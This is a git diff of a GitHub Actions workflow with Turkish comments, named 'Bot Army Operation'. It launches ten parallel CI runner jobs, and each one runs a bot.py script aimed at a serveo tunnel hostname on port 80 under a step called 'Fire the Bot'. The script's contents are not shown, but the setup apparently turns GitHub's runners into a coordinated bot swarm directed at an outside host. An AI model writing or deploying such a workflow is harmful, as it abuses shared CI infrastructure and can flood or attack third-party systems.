@@ -1,8 +1,27 @@
-strategy:
-  matrix:
-    bot_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # Burayı 20'ye kadar uzatabilirsin
+name: Bot Ordusu Operasyonu
+
+on:
+  workflow_dispatch: # Manuel başlatmak için
+
 jobs:
   build:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        # GitHub aynı anda kaç tane makine açmaya çalışsın? 
+        # Buradaki her sayı bir bot makinesi demek.
+        bot_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+      fail-fast: false # Bir bot hata verirse diğerlerini durdurma
+
     steps:
-      - run: python3 bot.py a581dbde67190beb-34-6-91-209.serveousercontent.com 80
+      - name: Kodu Çek
+        uses: actions/checkout@v3
+
+      - name: Python Hazırla
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+
+      - name: Botu Ateşle
+        # Tünel adresin ve portun buraya sabitlendi
+        run: python3 bot.py a581dbde67190beb-34-6-91-209.serveousercontent.com 80
